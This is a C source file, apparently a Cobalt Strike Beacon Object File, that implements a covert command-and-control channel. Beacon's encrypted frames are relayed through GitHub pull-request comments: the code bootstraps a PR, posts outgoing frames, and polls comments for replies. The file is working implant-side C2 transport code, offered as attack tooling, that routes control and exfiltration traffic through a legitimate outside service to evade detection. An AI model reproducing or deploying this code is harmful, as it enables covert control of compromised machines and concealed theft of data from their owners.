#include "compat.h"
#include "udc2.h"
#include "github.h"
#include "protocol.h"

#ifdef BOF
#include "util.c"
#include "b64.c"
#include "json.c"
#include "github.c"
#endif

static gh_ctx_t g_ctx;

/*
 * Beacon calls this to send/receive encrypted frame data via the UDC2 channel.
 * sendBuf is a complete frame: | 4-byte LE length | payload |. Copy the
 * response into recvBuf in the same form. Return the number of bytes written
 * to recvBuf, or -1 on error. -1 or 0 resets the Beacon session (udc2-vs).
 */
int udc2Proxy(const char *sendBuf, int sendBufLen, char *recvBuf, int recvBufMaxLen)
{
	unsigned long long after;
	int n;

	if (!sendBuf || sendBufLen < FRAME_LENGTH || !recvBuf || recvBufMaxLen < FRAME_LENGTH) {
		return -1;
	}
	if (gh_post_frame(&g_ctx, (const unsigned char *)sendBuf, sendBufLen) != 0) {
		LOGERR("udc2Proxy send failed");
		return -1;
	}
	after = g_ctx.last_comment_id;
	n = gh_wait_frame(&g_ctx, after, recvBuf, recvBufMaxLen);
	if (n < FRAME_LENGTH) {
		LOGERR("udc2Proxy recv failed");
		return -1;
	}
	return n;
}

void udc2Close(void)
{
	gh_close(&g_ctx);
}

static int init(void)
{
	if (gh_init(&g_ctx) != 0) {
		return -1;
	}
	if (gh_bootstrap_pr(&g_ctx) != 0) {
		gh_close(&g_ctx);
		return -1;
	}
	return 0;
}

void go(char *args, int len)
{
	PUDC2_INFO funcs = (PUDC2_INFO)args;

	(void)len;
	if (!funcs) {
		return;
	}
	if (init() == 0) {
		funcs->proxyCall = udc2Proxy;
		funcs->proxyClose = udc2Close;
		funcs->version = 0x041200;
	}
}
